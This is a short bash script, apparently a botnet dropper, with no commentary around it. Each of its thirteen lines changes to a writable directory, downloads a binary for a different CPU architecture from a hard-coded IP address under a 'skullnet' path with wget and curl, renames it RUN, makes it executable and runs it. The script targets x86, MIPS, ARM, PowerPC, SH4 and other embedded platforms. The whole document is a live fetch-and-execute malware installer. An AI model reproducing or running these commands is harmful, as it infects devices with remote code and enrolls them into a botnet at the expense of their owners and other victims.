#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.x86; curl -O http://209.141.50.31/skullnet/haha.x86;cat haha.x86 >RUN;chmod +x *;./RUN x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.mips; curl -O http://209.141.50.31/skullnet/haha.mips;cat haha.mips >RUN;chmod +x *;./RUN mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.arc; curl -O http://209.141.50.31/skullnet/haha.arc;cat haha.arc >RUN;chmod +x *;./RUN arc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.x86_64; curl -O http://209.141.50.31/skullnet/haha.x86_64;cat haha.x86_64 >RUN;chmod +x *;./RUN x86_64
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.mpsl; curl -O http://209.141.50.31/skullnet/haha.mpsl;cat haha.mpsl >RUN;chmod +x *;./RUN mpsl
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.arm; curl -O http://209.141.50.31/skullnet/haha.arm;cat haha.arm >RUN;chmod +x *;./RUN arm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.arm5; curl -O http://209.141.50.31/skullnet/haha.arm5;cat haha.arm5 >RUN;chmod +x *;./RUN arm5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.arm6; curl -O http://209.141.50.31/skullnet/haha.arm6;cat haha.arm6 >RUN;chmod +x *;./RUN arm6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.arm7; curl -O http://209.141.50.31/skullnet/haha.arm7;cat haha.arm7 >RUN;chmod +x *;./RUN arm7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.ppc; curl -O http://209.141.50.31/skullnet/haha.ppc;cat haha.ppc >RUN;chmod +x *;./RUN ppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.spc; curl -O http://209.141.50.31/skullnet/haha.spc;cat haha.spc >RUN;chmod +x *;./RUN spc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.m68k; curl -O http://209.141.50.31/skullnet/haha.m68k;cat haha.m68k >RUN;chmod +x *;./RUN m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.50.31/skullnet/haha.sh4; curl -O http://209.141.50.31/skullnet/haha.sh4;cat haha.sh4 >RUN;chmod +x *;./RUN sh4
